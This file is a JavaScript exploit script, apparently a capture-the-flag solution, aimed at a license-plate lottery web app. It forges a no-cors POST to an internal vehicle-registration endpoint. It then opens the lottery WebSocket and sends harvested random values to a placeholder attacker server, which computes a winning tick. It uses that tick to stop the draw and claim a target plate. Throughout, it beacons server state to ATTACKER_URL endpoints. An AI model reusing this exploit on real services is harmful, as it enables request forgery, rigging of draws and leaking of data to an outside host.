const attackerUrl = "ATTACKER_URL";
const debugUrl = `${attackerUrl}/log`;
const verifyUrl = `${attackerUrl}/verify`;
const lotteryUrl = "LOTTERY_URL";
const internalUrl = "INTERNAL_URL";
const vin = "VIN";
let MAX = -1;
let TGT = -1;

function findL337Index(state) {
    const originalIndex = 228017;
    let index = originalIndex; // based on zero state
    for (let i = 0; i < state.length; i++) {
        if (state[i] > originalIndex) {
            index--;
        } else if (state[i] === originalIndex) {
            // tf it got taken?
            return undefined;
        }
    }
    return index;
}

async function attempt() {
    let receivedCount = 0;
    let target = 0;
    let collected = [];
    let debug = true;

    const ws = new WebSocket(lotteryUrl);
    ws.onopen = () => {
        navigator.sendBeacon(debugUrl, "socket open");
        ws.send(
            JSON.stringify({
                action: "init",
                vin: vin,
            })
        );
    };

    ws.onmessage = async (msg) => {
        const data = JSON.parse(msg.data);
        switch (data["action"]) {
            case "ready":
                const state = data["state"];
                const max = 676000 - state.length;
                target = findL337Index(state);
                MAX = max;
                TGT = target;
                ws.send(
                    JSON.stringify({
                        action: "randomize",
                    })
                );
                break;
            case "randomizing":
                if (receivedCount < 2) {
                    receivedCount += 1;
                    const nums = data["state"];
                    collected.push(...nums);
                    if (collected.length < 100) {
                    } else {
                        fetch(`${attackerUrl}/compute`, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                            },
                            body: JSON.stringify({
                                target: TGT,
                                max: MAX,
                                nums: collected,
                            }),
                        })
                            .then(async (raw) => {
                                const res = await raw.text();
                                const tick = parseInt(res, 10);
                                if (tick === -1) {
                                    // close ws
                                    ws.close();
                                    await new Promise((r) => setTimeout(r, 1000));
                                    // do another attempt
                                    await attempt();
                                } else {
                                    navigator.sendBeacon(debugUrl, "found!");
                                    ws.send(JSON.stringify({
                                        action: "stop",
                                        tickToStop: tick,
                                    }));
                                }
                            })
                            .catch((err) => {
                                navigator.sendBeacon(
                                    debugUrl,
                                    "error contacting ngrok, " + err
                                );
                            });
                    }
                } else if (debug && receivedCount >= 2) {
                    navigator.sendBeacon(verifyUrl, msg.data);
                }
                break;
            case "error":
                navigator.sendBeacon(debugUrl, "error, sus, " + msg.data);
                break;
            case "choosing":
                // check if state in json
                if (data["state"] !== undefined) {
                    const state = data["state"];
                    if (debug) {
                        navigator.sendBeacon(debugUrl, "choosing");
                        navigator.sendBeacon(debugUrl, state);
                    }
                    const index = state.findIndex((x) => Math.floor(x) === target);
                    if (index !== -1) {
                        navigator.sendBeacon(debugUrl, "gg!");
                        ws.send(
                            JSON.stringify({
                                action: "choose",
                                plate: index,
                            })
                        );
                        // confirm
                        ws.send(
                            JSON.stringify({
                                action: "confirm",
                            })
                        );
                    }
                }
                break
            default:
                navigator.sendBeacon(debugUrl, "stopping")
                navigator.sendBeacon(debugUrl, msg.data);
                break;
        }
    };
}

(async () => {
    navigator.sendBeacon(debugUrl, "start");
    fetch(`${internalUrl}/register-vehicle`, {
        method: "POST",
        mode: "no-cors",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `vin=${vin}&name=lol&pid=lol&birthdate=lol`,
    })
        .then(async (res) => {
            navigator.sendBeacon(debugUrl, "registered");
            await attempt();
        })
})();
